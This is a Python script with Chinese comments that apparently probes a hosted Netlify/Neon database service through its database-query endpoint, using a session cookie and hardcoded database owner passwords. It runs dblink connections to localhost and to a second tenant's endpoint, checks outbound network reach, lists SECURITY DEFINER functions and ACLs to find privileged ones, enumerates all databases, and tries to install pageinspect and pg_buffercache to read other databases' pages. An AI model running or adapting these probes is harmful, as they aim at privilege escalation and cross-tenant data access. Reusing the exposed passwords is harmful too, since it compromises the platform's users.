# -*- coding: utf-8 -*-
"""技术层测试 3:
1. 清理 fdw 残留(drop foreign table)
2. dblink_connect 基线(localhost 带密码)+ 出站 B(网络判定)
3. neon/neon_utils 扩展函数全清单 + ACL(找高权限函数)
4. pg_database 列表(compute 是否多库/多租户)
5. 其他 trusted 扩展安装试探(pageinspect/pg_buffercache/amcheck)"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'
PWD_A_OWNER = 'npg_MtTpnyk2LE4j'
PWD_B_OWNER = 'npg_TWUSd2Mavu7G'


def q(sql, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def tx(qs, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:1500].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def qq(s):
    return "'" + s.replace("'", "''") + "'"


print('== 清理 fdw 残留 ==')
print('drop ft [%d]' % q('drop foreign table if exists ft_b')[0])
print('drop srv [%d] %s' % q('drop server if exists srv_b'))
print('drop srv cascade [%d] %s' % q('drop server if exists srv_b cascade'))

print()
print('== dblink_connect 基线/出站 ==')
# 基线 localhost 带密码
st, out = tx(["select dblink_connect('c1', %s)" % qq('host=127.0.0.1 port=5432 dbname=netlifydb user=netlifydb_owner password=' + PWD_A_OWNER),
              "select * from dblink('c1', %s) as t(u text)" % qq('select current_user::text'),
              "select dblink_disconnect('c1')"])
print('localhost base [%d] %s' % (st, out[:300]))
# 出站 B endpoint
st, out = tx(["select dblink_connect('c2', %s)" % qq('host=ep-cold-unit-ae9s4l3i.c-2.us-east-2.db.netlify.com port=5432 dbname=netlifydb user=netlifydb_owner password=' + PWD_B_OWNER),
              "select * from dblink('c2', %s) as t(u text)" % qq('select current_user::text'),
              "select dblink_disconnect('c2')"])
print('outbound B     [%d] %s' % (st, out[:300]))
# 出站公网数字 IP(10.0.0.1 应秒败/超时)
st, out = tx(["select dblink_connect('c3', %s)" % qq('host=10.0.0.1 port=5432 dbname=x user=x password=x'),
              "select dblink_disconnect('c3')"])
print('outbound 10.0.0.1 [%d] %s' % (st, out[:300]))

print()
print('== neon 扩展函数清单 ==')
st, out = q("select p.proname||'('||pg_get_function_identity_arguments(p.oid)||')' as fn, p.prosecdef, "
            "coalesce(p.proacl::text,'(null)') as acl from pg_proc p "
            "join pg_extension e on p.oid in (select objid from pg_depend d where d.refclassid='pg_extension'::regclass "
            "and d.classid='pg_proc'::regclass and d.refobjid=e.oid and e.extname in ('neon','neon_utils','dblink','postgres_fdw')) "
            "order by 1 limit 80")
print('[%d] %s' % (st, out[:1900]))
print()
print('== pg_database 列表 ==')
st, out = q("select d.datname, d.datdba::regrole, pg_size_pretty(pg_database_size(d.oid)) from pg_database d order by 1")
print('[%d] %s' % (st, out[:600]))
print()
print('== trusted 扩展安装试探 ==')
for ext in ['pageinspect', 'pg_buffercache', 'amcheck']:
    st, out = q('create extension if not exists ' + ext)
    print('create %s [%d] %s' % (ext, st, out[:200]))
print('-- installed now:', q("select extname from pg_extension order by 1")[1][:300])
# 若装成功读 buffer/page 看其他库?先看函数权限
for ext in ['pageinspect', 'pg_buffercache', 'amcheck']:
    st, out = q("select count(*) from pg_proc p join pg_depend d on d.objid=p.oid and d.classid='pg_proc'::regclass "
                "join pg_extension e on d.refobjid=e.oid where e.extname=%s and p.prosecdef" % qq(ext))
    print('%s definer count [%d] %s' % (ext, st, out[:200]))
